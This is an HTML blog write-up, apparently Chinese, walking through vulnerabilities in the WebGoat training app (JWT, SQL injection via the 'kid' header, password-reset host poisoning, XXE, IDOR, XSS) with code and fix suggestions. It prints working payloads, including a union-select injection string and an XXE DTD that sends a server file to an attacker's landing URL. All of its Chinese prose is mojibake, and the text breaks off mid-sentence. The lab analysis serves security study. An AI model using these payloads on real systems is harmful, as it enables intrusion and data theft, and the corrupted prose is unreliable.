class="line"><span class="keyword">if</span> (user == <span class="keyword">null</span> || refreshToken == <span class="keyword">null</span>) &#123;            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (validRefreshTokens.contains(refreshToken)) &#123;            validRefreshTokens.remove(refreshToken);            <span class="keyword">return</span> ok(createNewTokens(user));        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>åˆ©ç”¨ç™»å½•æ¥å£ï¼Œç™»å½•å½“å‰ç”¨æˆ· jerryï¼Œè·å–åˆ·æ–° refresh_token</p><p><img src="pt14.png" alt=""></p><p>æ²¡æœ‰æˆåŠŸåˆ·æ–° tokenï¼ŒæŠ¥é”™ä¿¡æ¯ï¼šç»™å‡ºçš„ token æ— æ³•æ­£å¸¸è§£æ</p><p>jwtâ€“&gt;JWTFinalEndpoint.resetVotes()</p><p>å­˜åœ¨ sql æ³¨å…¥ç‚¹ &quot;kid&quot;(KID ä»£è¡¨ â€œå¯†é’¥åºå·â€ï¼ˆKey IDï¼‰ã€‚å®ƒæ˜¯ JWT å¤´éƒ¨çš„ä¸€ä¸ªå¯é€‰å­—æ®µï¼Œå¼€å‘äººå‘˜å¯ä»¥ç”¨å®ƒæ ‡è¯†è®¤è¯ token çš„æŸä¸€å¯†é’¥)</p><p>å¯ä»¥é€šè¿‡ union è¿›è¡Œç»•è¿‡ï¼Œå°† &quot;key&quot; ä½œä¸ºè®¤è¯å¯†é’¥ï¼Œä½¿ç”¨<a href="https://jwt.io/#debugger">åœ¨çº¿å·¥å…·</a>ä¼ªé€  token</p><p>è¿™é‡Œå°†æ•°æ®åº“å–å‡ºçš„ key ç”¨ base64 è§£ç äº†ï¼Œæ‰€ä»¥åœ¨æ³¨å…¥çš„æ—¶å€™è¦æ³¨å…¥ key çš„ base ç¼–ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&#x27; union select &#x27;</span>a2V5<span class="string">&#x27; from jwt_keys where id=&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> String kid = (String) header.get(<span class="string">&quot;kid&quot;</span>);                        <span class="keyword">try</span> (<span class="keyword">var</span> connection = dataSource.getConnection()) &#123;                            ResultSet rs = connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);                            <span class="keyword">while</span> (rs.next()) &#123;                                <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));                            &#125;                        &#125;</span><br></pre></td></tr></table></figure><p>å»ºè®®</p><ol><li>ä¿è¯å¯†é’¥çš„ä¿å¯†æ€§</li><li>ç­¾åç®—æ³•å›ºå®šåœ¨åç«¯ï¼Œä¸ä»¥ JWT é‡Œçš„ç®—æ³•ä¸ºæ ‡å‡†</li><li>é¿å…æ•æ„Ÿä¿¡æ¯ä¿å­˜åœ¨ JWT ä¸­</li><li>å°½é‡ JWT çš„æœ‰æ•ˆæ—¶é—´è¶³å¤ŸçŸ­</li><li>å°½é‡é¿å…ç”¨ç”¨æˆ·å¯ä»¥è·å–çš„å‚æ•°åˆ·æ–° tokenï¼Œé¿å…é€»è¾‘ç»•è¿‡</li><li>æ³¨æ„ header éƒ¨åˆ†ï¼Œè‹¥æœ‰ sql è¯­å¥ï¼Œå»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘</li></ol><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>a2v5 æ˜¯ key çš„ base64 ç¼–ç </p><p><img src="pt15.png" alt=""></p><p><img src="pt16.png" alt=""></p></li><li><p>å®‰å…¨é—®é¢˜</p><p>password_resetâ€“&gt;QuestionsAssignment</p><p>å¯†ä¿é—®é¢˜è®¾ç½®ä¸ºï¼Œä½ æœ€å–œæ¬¢çš„é¢œè‰²æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥ç›´æ¥ç”¨å¸¸è§é¢œè‰²ç”Ÿæˆå­—å…¸è¿›è¡Œçˆ†ç ´ï¼Œå»ºè®®ä½¿ç”¨æ›´å¤æ‚çš„éš¾ä»¥ç ´è§£çš„é—®é¢˜ï¼Œå¹¶ä¸”é™åˆ¶è¾“å…¥æ¬¡æ•°</p><p><img src="ba01.png" alt=""></p><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="pt17.png" alt=""></p><p>password_resetâ€“&gt;ResetLinkAssignmentForgotPassword</p><p>å‚æ•° host æ˜¯ä» Request å¤´éƒ¨è·å–çš„ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶ host å‚æ•°ï¼Œç»™ç”¨æˆ·å‘é€ä¸€ä¸ªæˆ‘ä»¬æ§åˆ¶çš„ linkï¼Œç”¨æˆ·ç‚¹å‡»åè®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è®°å½•è¯¥è¯·æ±‚ï¼Œä»è€Œè·å–åˆ°åé¢çš„ resetLinkï¼Œç„¶åæˆ‘ä»¬å†é€šè¿‡æ­£å¸¸çš„è®¿é—®ä¿®æ”¹å¯†ç </p></li></ol><p>ä¿®å¤å»ºè®®ï¼š</p><pre><code>1. ç¦æ­¢å°†ç”¨æˆ·å¯æ§çš„å‚æ•°æ‹¼æ¥è¿›å¯†ç é‡ç½®link2. é‡ç½®é“¾æ¥åº”è¯¥æ˜¯ä¸€æ¬¡æ€§æœ‰æ•ˆçš„</code></pre>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fakeClickingLinkEmail</span><span class="params">(String host, String resetLink)</span> </span>&#123;        <span class="keyword">try</span> &#123;            HttpHeaders httpHeaders = <span class="keyword">new</span> HttpHeaders();            HttpEntity httpEntity = <span class="keyword">new</span> HttpEntity(httpHeaders);            <span class="keyword">new</span> RestTemplate().exchange(String.format(<span class="string">&quot;http://%s/PasswordReset/reset/reset-password/%s&quot;</span>, host, resetLink), HttpMethod.GET, httpEntity, Void.class);        &#125; <span class="keyword">catch</span> (Exception e) &#123;         <span class="comment">//don&#x27;t care        &#125;    &#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>æ”»å‡»è€…æœåŠ¡å™¨è®°å½•äº†è¯·æ±‚</p><p><img src="pt18.png" alt=""></p><h1 id="ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ä¼ è¾“ä¸å­˜å‚¨"><a class="markdownIt-Anchor" href="#ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ä¼ è¾“ä¸å­˜å‚¨">#</a> ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ä¼ è¾“ä¸å­˜å‚¨</h1><h2 id="æ¼æ´æè¿°-5"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-5">#</a> æ¼æ´æè¿°</h2><p>ç³»ç»Ÿæœªå¯¹ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç ã€èº«ä»½è¯å·ã€ç”µè¯å·ç ã€é“¶è¡Œå¡å·ç­‰ï¼‰è¿›è¡ŒåŠ å¯†ã€è„±æ•ç­‰æ“ä½œï¼Œå¯¼è‡´ç”¨æˆ·ä¿¡æ¯å­˜åœ¨æ³„éœ²çš„é£é™©ã€‚</p><h2 id="æ¼æ´æˆå› -5"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -5">#</a> æ¼æ´æˆå› </h2><p>æäº¤ç™»å½•è¯·æ±‚æ—¶ï¼Œæ²¡æœ‰å¯¹å¯†ç è¿›è¡ŒåŠ å¯†</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-5"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-5">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><p>å‰ç«¯å­˜å‚¨çš„ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submit_secret_credentials</span>(<span class="params"></span>) </span>&#123;    <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();    xhttp[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;#attack/307/100&#x27;</span>, <span class="literal">true</span>);<span class="comment">//sending the request is obfuscated, to descourage js readingvar _0xb7f9=[&quot;\x43\x61\x70\x74\x61\x69\x6E\x4A\x61\x63\x6B&quot;,&quot;\x42\x6C\x61\x63\x6B\x50\x65\x61\x72\x6C&quot;,&quot;\x73\x74\x72\x69\x6E\x67\x69\x66\x79&quot;,&quot;\x73\x65\x6E\x64&quot;];xhttp[_0xb7f9[3]](JSON[_0xb7f9[2]](&#123;username:_0xb7f9[0],password:_0xb7f9[1]&#125;))&#125;</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨è¯¥å‡½æ•°çš„å‘åŒ…æˆªå›¾ï¼š</p><p><img src="se01.png" alt=""></p><p>å»ºè®®åœ¨æ•°æ®ä¼ è¿‡ç¨‹ä¸­ï¼Œå¯¹ç”¨æˆ·çš„æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†</p><h1 id="xmlå¤–éƒ¨å®ä½“æ³¨å…¥"><a class="markdownIt-Anchor" href="#xmlå¤–éƒ¨å®ä½“æ³¨å…¥">#</a> XML å¤–éƒ¨å®ä½“æ³¨å…¥</h1><h2 id="æ¼æ´æè¿°-6"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-6">#</a> æ¼æ´æè¿°</h2><p>XXEï¼ˆXML External Entity Injectionï¼‰æ˜¯ä¸€ç§é’ˆå¯¹ XML ç»ˆç«¯å®æ–½çš„æ”»å‡»ï¼Œæ¼æ´äº§ç”Ÿçš„æ ¹æœ¬åŸå› å°±æ˜¯åœ¨ XML1.0 æ ‡å‡†ä¸­å¼•å…¥äº† â€œentityâ€ è¿™ä¸ªæ¦‚å¿µï¼Œä¸” â€œentityâ€ å¯ä»¥åœ¨é¢„å®šä¹‰çš„æ–‡æ¡£ä¸­è¿›è¡Œè°ƒç”¨ï¼ŒXXE æ¼æ´çš„åˆ©ç”¨å°±æ˜¯é€šè¿‡å®ä½“çš„æ ‡è¯†ç¬¦è®¿é—®æœ¬åœ°æˆ–è€…è¿œç¨‹å†…å®¹ã€‚é»‘å®¢æƒ³è¦å®æ–½è¿™ç§æ”»å‡»ï¼Œéœ€è¦åœ¨ XML çš„ payload åŒ…å«å¤–éƒ¨å®ä½“å£°æ˜ï¼Œä¸”æœåŠ¡å™¨æœ¬èº«å…è®¸å®ä½“æ‰©å±•ã€‚è¿™æ ·çš„è¯ï¼Œé»‘å®¢æˆ–è®¸èƒ½è¯»å– WEB æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿï¼Œé€šè¿‡ UNC è·¯å¾„è®¿é—®è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿï¼Œæˆ–è€…é€šè¿‡ HTTP/HTTPS è¿æ¥åˆ°ä»»æ„ä¸»æœºã€‚</p><h2 id="æ¼æ´æˆå› -6"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -6">#</a> æ¼æ´æˆå› </h2><p>XML è§£ææ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„è§£æï¼Œä¸”ç”¨æˆ·å¯æ§ REST XML æ ¼å¼çš„å‚æ•°ã€‚</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-6"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-6">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><ol><li><p>xxeâ€“&gt;SimpleXXE.createNewComment()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> secure = <span class="keyword">false</span>;     <span class="keyword">if</span> (<span class="keyword">null</span> != request.getSession().getAttribute(<span class="string">&quot;applySecurity&quot;</span>)) &#123;     secure = <span class="keyword">true</span>;     &#125;         Comment comment = comments.parseXml(commentStr, secure);         comments.addComment(comment, <span class="keyword">false</span>);         <span class="keyword">if</span> (checkSolution(comment)) &#123;             <span class="keyword">return</span> success(<span class="keyword">this</span>).build();         &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­è°ƒç”¨ Comment çš„ parseXml (commentStr, secure) æ–¹æ³•è¿›è¡Œ xml è§£æ<br>æ­£å¦‚ä»£ç ä¸­æ‰€ç¤ºï¼Œå¯ä»¥é€šè¿‡è®¾ç½® XMLConstants çš„ä¸¤ä¸ªå±æ€§æ¥ç¦ç”¨å¤–éƒ¨å®ä½“è§£æï¼Œé»˜è®¤çš„ç©ºå­—ç¬¦ä¸²å°±æ˜¯ç¦ç”¨ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šåè®®ç­‰ã€‚</p></li></ol><p>è¯¦ç»†ä¿¡æ¯å¯ä»¥çœ‹ XMLConstants ä¸­çš„æ³¨é‡Šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jc = JAXBContext.newInstance(Comment.class);     <span class="keyword">var</span> xif = XMLInputFactory.newInstance();   <span class="keyword">if</span> (secure) &#123;        xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>); <span class="comment">// Compliant     xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);  // compliant        &#125;                   var xsr = xif.createXMLStreamReader(new StringReader(xml));            var unmarshaller = jc.createUnmarshaller();        return (Comment) unmarshaller.unmarshal(xsr);</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="xxe01.png" alt=""></p><ol start="2"><li><p>xxeâ€“&gt;ContentTypeAssignment.createNewUser()</p><p>æ ¹æ® contentType åˆ¤æ–­æ•°æ®æ ¼å¼ï¼Œxml è§£æå’Œ 1 ä¸€æ ·ï¼Œå…¶ä½™åŒä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœæ˜¯xmlæ ¼å¼        if (null != contentType &amp;&amp; contentType.contains(MediaType.APPLICATION_XML_VALUE)) &#123;            String error = &quot;&quot;;            try &#123;            boolean secure = false;            if (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;            secure = true;            &#125;                Comment comment = comments.parseXml(commentStr, secure);                comments.addComment(comment, false);                if (checkSolution(comment)) &#123;                    attackResult = success(this).build();                &#125;            &#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="xxe02.png" alt=""></p><p><img src="xxe03.png" alt=""></p></li><li><p>xxeâ€“&gt;ContentTypeAssignment.addComment()</p><p>è¿™é‡Œä½œè€…ä¸ºäº†å¼„ä¸€ä¸ª blind xxeï¼Œç‰¹åˆ«è®¾ç½®äº†æäº¤æ­£ç¡®çš„å†…å®¹æ‰è¿”å› success</p><p>xml è§£æä»£ç å¹¶æ²¡æœ‰æ”¹å˜</p><p>å®é™…ä¸Šè¿˜æ˜¯é€šè¿‡å‚æ•°å®ä½“æ³¨å…¥ï¼ˆå‚æ•°å®ä½“ä¹Ÿèƒ½è¢«å¤–éƒ¨å¼•ç”¨ï¼‰ï¼Œä¸ºäº†çœ‹åˆ°æ•°æ®æ‰€ä»¥è¦é€šè¿‡ç›²æ‰“çš„æ–¹å¼ï¼Œå°† WEB æœåŠ¡å™¨çš„æœ¬åœ°æ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨</p><p>ä¿®å¤å»ºè®®åŒä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Solution is posted as a separate comment        if (commentStr.contains(CONTENTS)) &#123;            return success(this).build();        &#125;        try &#123;        boolean secure = false;        if (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;        secure = true;        &#125;            Comment comment = comments.parseXml(commentStr, secure);            if (CONTENTS.contains(comment.getText())) &#123;                comment.setText(&quot;Nice try, you need to send the file to WebWolf&quot;);            &#125;            comments.addComment(comment, false);        &#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p>a.dtd ä¸Šä¼ åœ¨æ”»å‡»æœåŠ¡å™¨ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload  &quot;&lt;!ENTITY attack SYSTEM &#x27;http://127.0.0.1:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="xxe04.png" alt=""></p><p>æ•°æ®é€šè¿‡å®ä½“å¼•ç”¨æˆåŠŸå›æ˜¾å•¦</p><p><img src="xxe05.png" alt=""></p></li></ol><h1 id="æ°´å¹³è¶Šæƒ"><a class="markdownIt-Anchor" href="#æ°´å¹³è¶Šæƒ">#</a> æ°´å¹³è¶Šæƒ</h1><h2 id="æ¼æ´æè¿°-7"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-7">#</a> æ¼æ´æè¿°</h2><p>æ°´å¹³è¶Šæƒæ¼æ´ï¼Œæ˜¯ä¸€ç§ â€œåŸºäºæ•°æ®çš„è®¿é—®æ§åˆ¶â€ è®¾è®¡ç¼ºé™·å¼•èµ·çš„æ¼æ´ã€‚ç”±äºæœåŠ¡å™¨ç«¯åœ¨æ¥æ”¶åˆ°è¯·æ±‚æ•°æ®è¿›è¡Œæ“ä½œæ—¶ï¼Œæ²¡æœ‰åˆ¤æ–­æ•°æ®çš„æ‰€å±äººï¼Œè€Œå¯¼è‡´çš„è¶Šæƒæ•°æ®è®¿é—®æ¼æ´ã€‚å¦‚æœåŠ¡å™¨ç«¯ä»å®¢æˆ·ç«¯æäº¤çš„ request å‚æ•°ï¼ˆç”¨æˆ·å¯æ§æ•°æ®ï¼‰ä¸­è·å–ç”¨æˆ· idï¼Œæ¶æ„æ”»å‡»è€…é€šè¿‡å˜æ¢è¯·æ±‚ ID çš„å€¼ï¼ŒæŸ¥çœ‹æˆ–ä¿®æ”¹ä¸å±äºæœ¬äººçš„æ•°æ®ã€‚</p><h2 id="æ¼æ´æˆå› -7"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -7">#</a> æ¼æ´æˆå› </h2><p>æœåŠ¡å™¨ç«¯å¯¹æ•°æ®çš„è®¿é—®æ§åˆ¶éªŒè¯ä¸å……åˆ†</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-7"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-7">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><p>idorâ€“&gt;IDORViewOtherProfile</p><p>å®‰å…¨ä»£ç å°†ç¡®ä¿åœ¨æ‹†é™¤æ‰€è¯·æ±‚çš„é…ç½®æ–‡ä»¶ä¹‹å‰ç¡®ä¿æœ‰ä¸€ä¸ªæ°´å¹³è®¿é—®æ§åˆ¶æ£€æŸ¥</p><p>ä¾‹å¦‚æ£€æŸ¥ç™»å½•ç”¨æˆ·çš„ session ä¸­çš„ idï¼ˆç”¨æˆ·ä¸å¯æ§ï¼‰æ˜¯å¦å’Œè¯·æ±‚çš„ id ä¸€è‡´</p><p>if(requestedProfile.getUserId().equals(authUserId))</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (userSessionData.getValue(<span class="string">&quot;idor-authenticated-as&quot;</span>).equals(<span class="string">&quot;tom&quot;</span>)) &#123;            <span class="comment">//going to use session auth to view this one            String authUserId = (String) userSessionData.getValue(&quot;idor-authenticated-user-id&quot;);            if (userId != null &amp;&amp; !userId.equals(authUserId)) &#123;                //on the right track                UserProfile requestedProfile = new UserProfile(userId);                // secure code would ensure there was a horizontal access control check prior to dishing up the requested profile                 if (requestedProfile.getUserId().equals(&quot;2342388&quot;)) &#123;                    return success(this).feedback(&quot;idor.view.profile.success&quot;).output(requestedProfile.profileToMap().toString()).build();                &#125; else &#123;                    return failed(this).feedback(&quot;idor.view.profile.close1&quot;).build();                &#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="yq01.png" alt=""></p><h1 id="xssè·¨ç«™è„šæœ¬"><a class="markdownIt-Anchor" href="#xssè·¨ç«™è„šæœ¬">#</a> XSS è·¨ç«™è„šæœ¬</h1><h2 id="æ¼æ´æè¿°-8"><a class="markdownIt-Anchor" href="#æ¼æ´æè¿°-8">#</a> æ¼æ´æè¿°</h2><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross Site Scriptï¼‰æ˜¯ä¸€ç§å°†æ¶æ„ JavaScript ä»£ç æ’å…¥åˆ°å…¶ä»– Web ç”¨æˆ·é¡µé¢é‡Œæ‰§è¡Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„çš„æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨çš„åŠ¨æ€å±•ç¤ºæ•°æ®åŠŸèƒ½ï¼Œåœ¨ HTML é¡µé¢é‡ŒåµŒå…¥æ¶æ„ä»£ç ã€‚å½“ç”¨æˆ·æµè§ˆè¯¥é¡µæ—¶ï¼Œè¿™äº›åµŒå…¥åœ¨ HTML ä¸­çš„æ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œç”¨æˆ·æµè§ˆå™¨è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç‰¹æ®Šç›®çš„ï¼Œå¦‚ cookie çªƒå–ã€å¸æˆ·åŠ«æŒã€æ‹’ç»æœåŠ¡æ”»å‡»ç­‰ã€‚</p><p>è·¨ç«™è„šæœ¬æ”»å‡»æœ‰ä»¥ä¸‹æ”»å‡»å½¢å¼ï¼š</p><p>1ã€åå°„å‹è·¨ç«™è„šæœ¬æ”»å‡»</p><p>æ”»å‡»è€…åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦ç­‰æ‰‹æ®µï¼Œå‘é€ä¸€ä¸ª URL é“¾æ¥ç»™ç”¨æˆ·æ‰“å¼€ï¼Œåœ¨ç”¨æˆ·æ‰“å¼€é¡µé¢çš„åŒæ—¶ï¼Œæµè§ˆå™¨ä¼šæ‰§è¡Œé¡µé¢ä¸­åµŒå…¥çš„æ¶æ„è„šæœ¬ã€‚</p><p>2ã€å­˜å‚¨å‹è·¨ç«™è„šæœ¬æ”»å‡»</p><p>æ”»å‡»è€…åˆ©ç”¨åº”ç”¨ç¨‹åºæä¾›çš„å½•å…¥æˆ–ä¿®æ”¹æ•°æ®çš„åŠŸèƒ½ï¼Œå°†æ•°æ®å­˜å‚¨åˆ°æœåŠ¡å™¨æˆ–ç”¨æˆ· cookie ä¸­ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆå±•ç¤ºè¯¥æ•°æ®çš„é¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šæ‰§è¡Œé¡µé¢ä¸­åµŒå…¥çš„æ¶æ„è„šæœ¬ï¼Œæ‰€æœ‰æµè§ˆè€…éƒ½ä¼šå—åˆ°æ”»å‡»ã€‚</p><p>3ã€DOM è·¨ç«™è„šæœ¬æ”»å‡»</p><p>ç”±äº HTML é¡µé¢ä¸­ï¼Œå®šä¹‰äº†ä¸€æ®µ JSï¼Œæ ¹æ®ç”¨æˆ·çš„è¾“å…¥ï¼Œæ˜¾ç¤ºä¸€æ®µ HTML ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è¾“å…¥æ—¶ï¼Œæ’å…¥ä¸€æ®µæ¶æ„è„šæœ¬ï¼Œæœ€ç»ˆå±•ç¤ºæ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚</p><p>DOM è·¨ç«™è„šæœ¬æ”»å‡»å’Œä»¥ä¸Šä¸¤ä¸ªè·¨ç«™è„šæœ¬æ”»å‡»çš„åŒºåˆ«æ˜¯ï¼ŒDOM è·¨ç«™æ˜¯çº¯é¡µé¢è„šæœ¬çš„è¾“å‡ºï¼Œåªæœ‰è§„èŒƒä½¿ç”¨ JavaScriptï¼Œæ‰å¯ä»¥é˜²å¾¡ã€‚</p><h2 id="æ¼æ´æˆå› -8"><a class="markdownIt-Anchor" href="#æ¼æ´æˆå› -8">#</a> æ¼æ´æˆå› </h2><p>åœ¨ HTML ä¸­å¸¸ç”¨åˆ°å­—ç¬¦å®ä½“ï¼Œå°†å¸¸ç”¨åˆ°çš„å­—ç¬¦å®ä½“æ²¡æœ‰è¿›è¡Œè½¬è¯‘ï¼Œå¯¼è‡´å®Œæ•´çš„æ ‡ç­¾å‡ºç°ï¼Œåœ¨å¯è¾“å…¥çš„æ–‡æœ¬æ¡†ç­‰æŸäº›åŒºåŸŸå†…è¾“å…¥ç‰¹å®šçš„æŸäº›æ ‡ç­¾å¯¼è‡´ä»£ç è¢«æ¶æ„ç¯¡æ”¹ã€‚</p><h2 id="ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-8"><a class="markdownIt-Anchor" href="#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-8">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2><ol><li><p>xssâ€“&gt;CrossSiteScriptingLesson5a</p><p>åå°„å‹ xss</p><p>é¢˜ç›®ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç”¨æˆ·è¾“å…¥çš„å‚æ•° field1ï¼Œå› ä¸ºæ˜¯é¢˜ç›®éœ€æ±‚è¿™é‡ŒåŒ¹é… &quot;.*&lt;script&gt;(console\.log|alert)\(.<em>\);?&lt;\/script&gt;.</em>&quot; ååœ¨é¡µé¢ä¸Šè¿›è¡Œè¾“å‡º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Predicate&lt;String&gt; XSS_PATTERN = Pattern.compile(            <span class="string">&quot;.*&lt;script&gt;(console\\.log|alert)\\(.*\\);?&lt;\\/script&gt;.*&quot;</span>            , Pattern.CASE_INSENSITIVE).asMatchPredicate();<span class="keyword">if</span> (XSS_PATTERN.test(field1)) &#123;            userSessionData.setValue(<span class="string">&quot;xss-reflected-5a-complete&quot;</span>, <span class="string">&quot;true&quot;</span>);            <span class="keyword">if</span> (field1.toLowerCase().contains(<span class="string">&quot;console.log&quot;</span>)) &#123;                <span class="keyword">return</span> success(<span class="keyword">this</span>).feedback(<span class="string">&quot;xss-reflected-5a-success-console&quot;</span>).output(cart.toString()).build();            &#125; <span class="keyword">else</span> &#123;                <span class="keyword">return</span> success(<span class="keyword">this</span>).feedback(<span class="string">&quot;xss-reflected-5a-success-alert&quot;</span>).output(cart.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æˆªå›¾ï¼š</p><p><img src="xss02.png" alt=""></p><p>ä¿®å¤å»ºè®®ï¼š</p><ol><li><p>æ ¹æ®è¦åœ¨ä½•å¤„ä½¿ç”¨ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨é€‚å½“çš„è½¬ä¹‰ / ç¼–ç æŠ€æœ¯ï¼šHTML è½¬ä¹‰ï¼ŒJavaScript è½¬ä¹‰ï¼ŒCSS è½¬ä¹‰ï¼ŒURL è½¬ä¹‰ç­‰ã€‚ä½¿ç”¨ç°æœ‰çš„è½¬ä¹‰åº“ï¼Œé™¤éç»å¯¹å¿…è¦ï¼Œå¦åˆ™è¯·ä¸è¦ç¼–å†™è‡ªå·±çš„åº“ã€‚</p></li><li><p>å¦‚æœç”¨æˆ·è¾“å…¥éœ€è¦åŒ…å« HTMLï¼Œåˆ™æ— æ³•å¯¹å…¶è¿›è¡Œè½¬ä¹‰ / ç¼–ç ï¼Œå› ä¸ºå®ƒä¼šç ´åæœ‰æ•ˆçš„æ ‡ç­¾ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·ä½¿ç”¨å—ä¿¡ä»»ä¸”ç»è¿‡éªŒè¯çš„åº“æ¥è§£æå’Œæ¸…é™¤ HTMLã€‚</p></li><li><p>ä¸º cookie è®¾ç½® HttpOnly æ ‡å¿—</p></li><li><p>ä½¿ç”¨å†…å®¹å®‰å…¨ç­–ç•¥</p></li></ol></li><li><p>DOM å‹</p><p>æºç ä¸­ä½¿ç”¨è·¯ç”±ï¼Œè·¯ç”±ä¸­çš„å‚æ•°è€Œæ— éœ€ç¼–ç å¯ä»¥æ‰§è¡Œ WebGoat 